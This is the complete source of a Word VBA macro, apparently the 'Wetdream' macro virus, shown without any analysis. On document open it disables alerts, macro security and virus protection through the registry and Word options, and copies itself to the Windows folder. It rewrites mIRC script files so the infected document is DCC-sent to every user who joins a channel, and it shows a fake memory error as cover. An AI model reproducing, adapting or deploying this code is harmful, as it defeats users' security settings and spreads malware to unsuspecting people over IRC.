   Attribute VB_Name = "Módulo1"
   Private Sub Document_Open()

   On Error Resume Next

       Application.DisplayAlerts = wdAlertsNone

   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then

       CommandBars("Macro").Controls("Security...").Enabled = False

       System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

   Else

       CommandBars("Tools").Controls("Macro").Enabled = False

       Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)

   End If

   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Wetdream") <> "Ahhh..." Then

       ActiveDocument.SaveAs "c:\windows\Wetdream.doc"

       If fso.fileexists("c:\mirc\mirc.ini") Then

       Open "c:\mirc\script.ini" For Output As #3

       Print #3, "[script]"

       Print #3, "n0=on 1:text:*:#: $1-30 | on 1:join:#: { /dcc send $nick c:\windows\Wetdream.doc | /j teensex } | on 1:join:#teensex: if ( $nick == $me ) /msg $chan HI YÅ!!"

       Close #3

   End If

       If fso.fileexists("c:\mirc32\mirc.ini") Then

       Open "c:\mirc32\script.ini" For Output As #3

       Print #3, "[script]"

       Print #3, "n0=on 1:text:*:#: $1-30 | on 1:join:#: { /dcc send $nick c:\windows\Wetdream.doc | /j teensex } | on 1:join:#teensex: if ( $nick == $me ) /msg $chan HI YÅ!!"

       Close #3

   End If

       If fso.fileexists("c:\program files\mirc\mirc.ini") Then

       Open "c:\program files\mirc\script.ini" For Output As #3

       Print #3, "[script]"

       Print #3, "n0=on 1:text:*:#: $1-30 | on 1:join:#: { /dcc send $nick c:\windows\Wetdream.doc | /j teensex } | on 1:join:#teensex: if ( $nick == $me ) /msg $chan HI YÅ!!"

       Close #3

   End If

       If fso.fileexists("c:\program files\mirc32\mirc.ini") Then

       Open "c:\program files\mirc32\script.ini" For Output As #3

       Print #3, "[script]"

       Print #3, "n0=on 1:text:*:#: $1-30 | on 1:join:#: { /dcc send $nick c:\windows\Wetdream.doc | /j teensex } | on 1:join:#teensex: if ( $nick == $me ) /msg $chan HI YÅ!!"

       Close #3

   End If

       System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Wetdream") = "Ahhh..."

   Else

       MsgBox "Not enough memory!", vbCritical, "Warning!"

   End If

   End Sub
